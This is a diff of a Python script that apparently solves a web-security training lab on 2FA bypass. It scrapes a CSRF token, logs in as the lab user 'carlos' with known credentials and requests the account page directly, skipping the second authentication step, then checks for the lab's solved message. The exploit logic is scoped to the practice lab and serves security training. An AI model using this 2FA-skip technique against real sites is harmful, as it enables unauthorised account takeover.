@@ -1,36 +1,53 @@
-# Keyword: 2FA not enforced
-
-
 import requests
 import sys
 import urllib3
+from bs4 import BeautifulSoup
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore
 
 # Burp Suite proxy
 proxies = {
     'http': 'http://127.0.0.1:8080',
-    'https': 'http://127.0.0.1:8080'    
+    'https': 'http://127.0.0.1:8080',  
 }
 
-def access_carlos_account(s, url):
-    print("Logging carlos account and bypassing 2FA verification")
-    login_url = url + '/login'
-    login_data = {
-        'username': 'carlos',
-        'password': 'montoya'
+headers = {
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
+}
+
+
+def get_csrf_token(s, url, path):
+    target_url = url + path
+    r = s.get(target_url, headers=headers)
+    soup = BeautifulSoup(r.text, 'html.parser')
+    csrf = soup.find("input", {'name': 'csrf'})
+    return csrf.get('value', '') if csrf else '' # type: ignore
+
+def login_acc(s, url, path, csrf_path, username, password):
+    login_url = url + path
+    payload = {
+        "csrf": get_csrf_token(s, url, csrf_path),
+        "username": username,
+        "password": password
     }
-    r = s.post(login_url, data=login_data, allow_redirects=False, verify=False, proxies=proxies)
-
-    # Confirm bypass
-    myaccount_url = url + '/my-account'
-    r = s.get(myaccount_url, verify=False, proxies=proxies)
-
-    if r.status_code == 200 and 'Log out' in r.text:
-        print("(+) Successfully bypassed 2FA verification")
+    r = s.post(login_url, data=payload, allow_redirects=False)
+    if r.status_code == 302:
+        print(f'[+] Successful login {username} account')
     else:
-        print("(-) Exploit failed")
+        print(f'[-] Fail to login {username} account')
         sys.exit(-1)
+
+def goto(s, url, path):
+    target_url = url + path
+    r = s.get(target_url)
+    return r
+
+def check_solved_lab(s, url):
+    r = s.get(url)
+    if "Congratulations, you solved the lab!" in r.text:
+        print("[+] Successful solved lab")
+        sys.exit(0)
 
 def main():
     if len(sys.argv) != 2:
@@ -39,8 +56,15 @@ def main():
         sys.exit(-1)
 
     s = requests.Session()
-    url = sys.argv[1]
-    access_carlos_account(s, url)
+    url = sys.argv[1].rstrip('/')
+
+    username = 'carlos'
+    password = 'montoya'
+
+    login_acc(s, url, '/login', '/login', username, password)
+    goto(s, url, '/my-account')
+
+    check_solved_lab(s, url)
 
 if __name__ == '__main__':
     main()
